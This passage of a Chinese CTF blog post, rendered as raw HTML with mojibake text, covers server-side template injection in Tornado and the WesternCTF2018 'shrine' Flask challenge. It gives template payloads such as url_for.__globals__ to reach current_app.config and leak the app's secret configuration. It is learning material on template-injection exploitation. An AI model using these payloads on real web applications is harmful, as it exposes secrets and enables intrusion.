<span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">&#x27;__main__&#x27;</span>:
 <span class="hljs-function"><span class="hljs-title">filehash</span>()</span></code></pre>
<p>æˆåŠŸï¼Œè¿™ä¸ªé¢˜ç›®å‘ç°æ¨¡æ¿æ³¨å…¥åçš„ä¸€ä¸ªå…³é”®è€ƒç‚¹åœ¨äº<code>handler.settings</code>ã€‚è¿™ä¸ªæ˜¯Tornadoæ¡†æ¶æœ¬èº«æä¾›ç»™ç¨‹åºå‘˜å¯å¿«é€Ÿè®¿é—®çš„é…ç½®æ–‡ä»¶å¯¹è±¡ä¹‹ä¸€ã€‚</p>
<h6 id="WesternCTF2018-shrine"><a class="header-anchor" href="#WesternCTF2018-shrine">ğŸ­</a>[WesternCTF2018]shrine</h6>
<p>åˆ†æä»£ç ï¼š</p>
<p><img src="/2021/04/05/wei/10.png" srcset="/img/loading.gif" alt="10"></p>
<p>åœ¨æ²¡æœ‰é»‘åå•çš„æ—¶å€™ï¼Œå¯ä»¥ä¼ å…¥ configï¼Œæˆ–<code>&#123; &#123;self._*dict_*&#125; &#125;</code>è·å–ï¼Œä½†å½“è¿™äº›è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›å…¨å±€å˜é‡åˆ©ç”¨æ²™ç›’é€ƒé€¸çš„æ–¹æ³•ï¼Œæ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚åœ¨shrineè·¯å¾„ä¸‹ä½¿ç”¨<code>&#123; &#123;url_for.__globlas__&#125; &#125;</code>æŸ¥çœ‹</p>
<p><img src="/2021/04/05/wei/11.jpg" srcset="/img/loading.gif" alt="11"></p>
<p><code>current_app</code>æ˜¯å…¨å±€å˜é‡ä»£ç†ï¼ŒæŸ¥çœ‹ä»–çš„<code>config</code>å³å¯</p>
<p><img src="/2021/04/05/wei/12.jpg" srcset="/img/loading.gif" alt="12"></p>
<p>ä¹Ÿå¯ç”¨<strong>get_flashed_messages</strong>ï¼š</p>
<pre><code class="hljs isbl">è¿”å›ä¹‹å‰åœ¨<span class="hljs-variable">Flask</span>ä¸­é€šè¿‡ <span class="hljs-function"><span class="hljs-title">flash</span>() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ <span class="hljs-title">get_flashed_messages</span>(</span></code></pre>
<p>æ­¤ç±»é¢˜ç›®æ€è·¯:</p>
<blockquote>
<p>æŸ¥é˜…ç›¸å…³æ¡†æ¶çš„æ–‡æ¡£</p>
<p>ä½¿ç”¨<code>dir</code>å†…çœ<code>locals</code>å¯¹è±¡æ¥æŸ¥çœ‹æ‰€æœ‰èƒ½å¤Ÿä½¿ç”¨çš„æ¨¡æ¿ä¸Šä¸‹æ–‡</p>
<p>ä½¿ç”¨diræ·±å…¥å†…çœæ‰€æœ‰å¯¹è±¡</p>
<p>ç›´æ¥åˆ†ææ¡†æ¶æºç </p>
</blockquote>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/04/06/wei4/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SSTI(äºŒ)</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/03/05/wei2/">
                        <span class="hidden-mobile">metasploitï¼ˆäºŒï¼‰â€”â€”åæ¸—é€æµ‹è¯•</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
